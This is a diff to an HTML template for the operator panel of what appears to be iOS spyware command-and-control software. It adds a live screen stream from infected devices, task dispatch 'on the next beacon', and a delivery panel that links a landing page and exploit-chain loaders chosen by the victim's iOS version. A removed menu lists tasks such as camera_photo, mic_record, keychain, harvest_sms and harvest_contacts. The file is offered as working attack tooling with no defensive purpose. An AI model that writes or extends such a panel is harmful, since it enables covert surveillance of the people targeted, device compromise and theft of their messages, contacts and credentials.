@@ -14,17 +14,48 @@
 
     <h1 style="margin-bottom:18px">{{ section.label }}</h1>
 
+    {% if section.slug == 'screen' %}
+    <section class="panel">
+      <header><h2>Live screen</h2><span class="muted" id="live-state">stopped</span></header>
+      <div class="live-wrap">
+        <div class="live-frame"><img id="live-img" alt=""></div>
+        <div class="live-side">
+          <p class="muted">Pick a device, then start the stream. Frames arrive over the agent
+            API at roughly 2 fps; the device posts them from its screen-capture task.</p>
+          <div class="hz-field" style="max-width:320px;margin:12px 0">
+            <select class="hz-input" id="live-device">
+              {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
+            </select>
+          </div>
+          <div class="hz-btn-group">
+            <button class="hz-btn" type="button" onclick="hzLive(true)">Start stream</button>
+            <button class="hz-btn hz-btn--ghost" type="button" onclick="hzLive(false)">Stop</button>
+          </div>
+          <p class="muted" id="live-note" style="margin-top:12px;font-size:.8rem"></p>
+        </div>
+      </div>
+    </section>
+    {% endif %}
+
     <section class="panel">
       <header>
         <div>
           <h2>{{ section.label }}</h2>
           <p class="muted" style="margin:4px 0 0">{{ section.blurb }}</p>
         </div>
-        <div class="hz-btn-group">
-          <button class="hz-btn" type="button"><span class="hz-btn__icon">+</span> New</button>
-          <button class="hz-btn hz-btn--ghost" type="button">Export</button>
-          <button class="hz-btn hz-btn--ghost hz-btn--danger" type="button">Purge</button>
-        </div>
+        {% if actions %}
+        <form method="post" action="/admin/console" class="hz-btn-group">
+          <input type="hidden" name="back" value="{{ section.slug }}">
+          <div class="hz-field" style="min-width:190px">
+            <select class="hz-input" name="device">
+              {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
+            </select>
+          </div>
+          {% for act in actions %}
+            <button class="hz-btn hz-btn--sm" type="submit" name="action" value="{{ act.value }}">{{ act.label }}</button>
+          {% endfor %}
+        </form>
+        {% endif %}
       </header>
 
       <table class="hz">
@@ -33,18 +64,21 @@
         {% for row in rows %}
           <tr>{% for cell in row %}<td>{{ cell }}</td>{% endfor %}</tr>
         {% else %}
-          <tr><td colspan="{{ columns|length }}" class="muted">{{ empty or 'No records.' }}</td></tr>
+          <tr><td colspan="{{ columns|length }}" class="muted">{{ empty or 'No records yet - dispatch a task above.' }}</td></tr>
         {% endfor %}
         </tbody>
       </table>
+
+      {% if flash %}<div class="alert" style="margin-top:14px">{{ flash }}</div>{% endif %}
     </section>
 
     {% if section.slug == 'console' %}
     <section class="panel">
       <header><h2>Dispatch task</h2>
-        <span class="muted" style="font-size:.8rem">queued tasks are delivered on the next beacon</span>
+        <span class="muted" style="font-size:.8rem">delivered on the next beacon</span>
       </header>
       <form class="row" method="post" action="/admin/console">
+        <input type="hidden" name="back" value="console">
         <div class="hz-field" style="min-width:200px">
           <select class="hz-input" name="device">
             {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
@@ -60,14 +94,13 @@
         </div>
         <button class="hz-btn" type="submit">Send</button>
       </form>
-      {% if flash %}<div class="alert" style="margin-top:14px">{{ flash }}</div>{% endif %}
     </section>
     {% endif %}
 
     {% if section.slug == 'files' %}
     <section class="panel">
       <header><h2>Browse path</h2>
-        <span class="muted" style="font-size:.8rem">runs fs_list on the target</span>
+        <span class="muted" style="font-size:.8rem">queues fs_list on the target</span>
       </header>
       <form class="row" method="get" action="/admin/files">
         <div class="hz-field" style="min-width:200px">
@@ -80,37 +113,41 @@
         </div>
         <button class="hz-btn" type="submit">List</button>
       </form>
-      {% if flash %}<div class="alert" style="margin-top:14px">{{ flash }}</div>{% endif %}
     </section>
     {% endif %}
 
-    {% if section.slug == 'targets' %}
+    {% if section.slug == 'delivery' %}
     <section class="panel">
-      <header><h2>Quick actions</h2></header>
-      <form class="row" method="post" action="/admin/targets">
-        <div class="hz-field" style="min-width:200px">
-          <select class="hz-input" name="device">
-            {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
-          </select>
-        </div>
-        <div class="hz-field" style="min-width:200px">
-          <select class="hz-input" name="type">
-            <option value="sysinfo">sysinfo</option>
-            <option value="procs">procs</option>
-            <option value="location_once">location_once</option>
-            <option value="screen_frame">screen_frame</option>
-            <option value="camera_photo">camera_photo</option>
-            <option value="mic_record">mic_record</option>
-            <option value="keychain">keychain</option>
-            <option value="harvest_sms">harvest_sms</option>
-            <option value="harvest_contacts">harvest_contacts</option>
-          </select>
-        </div>
-        <button class="hz-btn" type="submit">Run</button>
-      </form>
-      {% if flash %}<div class="alert" style="margin-top:14px">{{ flash }}</div>{% endif %}
+      <header><h2>Delivery endpoint</h2></header>
+      <p class="muted">Landing page and chain assets are served from this host; routers.js picks
+        the chain by the visiting device's iOS version.</p>
+      <div class="hz-btn-group" style="margin-top:12px">
+        <a class="hz-btn hz-btn--sm" href="/landing" target="_blank">Open landing</a>
+        <a class="hz-btn hz-btn--sm hz-btn--ghost" href="/routers.js" target="_blank">routers.js</a>
+        <a class="hz-btn hz-btn--sm hz-btn--ghost" href="/exploit/rce_loader.js" target="_blank">rce_loader.js</a>
+        <a class="hz-btn hz-btn--sm hz-btn--ghost" href="/loader_26_deploy.js" target="_blank">loader_26_deploy.js</a>
+      </div>
     </section>
     {% endif %}
   </main>
 </div>
+<script>
+function hzLive(on){
+  var img = document.getElementById('live-img');
+  var sel = document.getElementById('live-device');
+  var st = document.getElementById('live-state');
+  var note = document.getElementById('live-note');
+  if (!img) return;
+  var id = sel ? sel.value : '';
+  if (on && id) {
+    img.src = '/api/agent/' + encodeURIComponent(id) + '/screen/stream?t=' + Date.now();
+    if (st) st.textContent = 'live';
+    if (note) note.textContent = 'streaming ' + id;
+  } else {
+    img.removeAttribute('src');
+    if (st) st.textContent = 'stopped';
+    if (note) note.textContent = id ? 'stopped' : 'no device selected';
+  }
+}
+</script>
 {% include 'partials/foot.html' %}
